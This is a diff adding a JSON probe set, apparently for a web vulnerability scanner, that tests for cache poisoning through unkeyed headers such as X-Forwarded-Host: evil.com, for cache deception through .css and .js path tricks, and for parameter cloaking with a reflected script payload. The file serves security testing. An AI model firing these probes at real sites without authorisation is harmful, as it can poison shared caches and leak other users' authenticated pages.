@@ -1,0 +1,114 @@
+{
+  "category": "cache_poisoning",
+  "contexts": {
+    "unkeyed_headers": {
+      "description": "Web cache poisoning via unkeyed headers — inject values into cached responses by abusing headers the cache ignores when computing the cache key",
+      "tech_match": ["Varnish", "Cloudflare", "Akamai", "Fastly", "CloudFront", "Nginx"],
+      "param_match": [],
+      "parameter_names": ["cb", "cachebuster", "utm_source", "utm_content", "v", "ver", "cache"],
+      "probes": [
+        {
+          "payload": "X-Forwarded-Host: evil.com",
+          "description": "X-Forwarded-Host injection — if evil.com appears in response body and cache headers present, the header is unkeyed and poisons cached content",
+          "matchers": [
+            {"type": "word", "words": ["evil.com"], "condition": "or"},
+            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status", "X-Varnish"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "X-Forwarded-Scheme: http",
+          "description": "X-Forwarded-Scheme downgrade — forces 301/302 redirect to HTTP, poisoning cache with redirect loop or protocol downgrade",
+          "matchers": [
+            {"type": "status", "codes": [301, 302], "condition": "or"},
+            {"type": "header", "headers": ["Location"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "X-Original-URL: /admin",
+          "description": "X-Original-URL override — backend processes /admin instead of requested path; response length diff indicates path override worked",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100}
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        }
+      ]
+    },
+    "cache_deception": {
+      "description": "Web cache deception — trick the cache into storing authenticated responses by appending static file extensions to dynamic URLs",
+      "tech_match": ["Varnish", "Cloudflare", "Akamai", "Fastly", "CloudFront", "Nginx"],
+      "param_match": [],
+      "parameter_names": ["cb", "cachebuster", "utm_source", "utm_content", "v", "ver", "cache"],
+      "probes": [
+        {
+          "payload": "/TARGET_PATH/nonexistent.css",
+          "description": "Path confusion with .css extension — cache stores authenticated page content as static CSS resource, leaking sensitive data to unauthenticated users",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50},
+            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status", "X-Varnish"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "/TARGET_PATH;x=1.js",
+          "description": "Semicolon path parameter with .js extension — backend ignores semicolon suffix, cache keys on full path including .js and stores authenticated content",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50},
+            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status", "X-Varnish"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        },
+        {
+          "payload": "/TARGET_PATH%2f.css",
+          "description": "URL-encoded slash with .css extension — path normalization discrepancy between cache and backend causes authenticated content to be cached as static file",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50},
+            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status", "X-Varnish"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        }
+      ]
+    },
+    "parameter_cloaking": {
+      "description": "Cache key manipulation via parameter cloaking — exploit cache parameter parsing discrepancies to inject unkeyed parameters into cached responses",
+      "tech_match": ["Varnish", "Cloudflare", "Akamai", "Fastly", "CloudFront", "Nginx"],
+      "param_match": [],
+      "parameter_names": ["cb", "cachebuster", "utm_source", "utm_content", "v", "ver", "cache"],
+      "probes": [
+        {
+          "payload": "?utm_content=x;evil=<script>alert(1)</script>",
+          "description": "Semicolon parameter cloaking — cache excludes utm_content from key but backend parses semicolon as parameter delimiter, reflecting the evil parameter value in cached response",
+          "matchers": [
+            {"type": "word", "words": ["<script>alert(1)</script>"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "GET_WITH_BODY",
+          "description": "Fat GET request — send GET with body parameters; cache ignores request body when computing key but backend processes body params, poisoning cached response with attacker-controlled values",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
